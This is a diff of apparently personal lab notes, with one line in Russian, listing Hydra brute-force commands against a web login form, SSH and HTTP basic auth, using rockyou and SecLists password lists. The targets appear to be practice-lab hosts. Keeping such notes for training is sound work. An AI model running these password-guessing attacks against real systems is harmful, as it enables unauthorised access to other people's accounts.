@@ -1,6 +1,13 @@
-FORM:
+# FORM:
 sudo hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.82.173.73 http-post-form "/login/:username=admin&password=^PASS^:F=incorrect" -V -t 4 -w 5
 
-SSH:
+# SSH:
 
 sudo hydra -l molly -P /usr/share/seclists/Passwords/Common-Credentials/100k-most-used-passwords-NCSC.txt 10.82.171.73 ssh -V -t 4
+
+# BASIC HTTP AUTHORIZATION(Authorization: Basic <base64 encoded>):
+
+sudo hydra -l admin -P /usr/share/wordlists/SecLists/Passwords/Common-Credentials/500-worst-passwords.txt "http-get://enum.thm/labs/basic_auth:A=BASIC" -V -t 4 -w 5 
+или упрощенно:
+
+sudo hydra -l admin -P /usr/share/wordlists/SecLists/Passwords/Common-Credentials/500-worst-passwords.txt enum.thm http-get /labs/basic_auth -V -t 4 -w 5
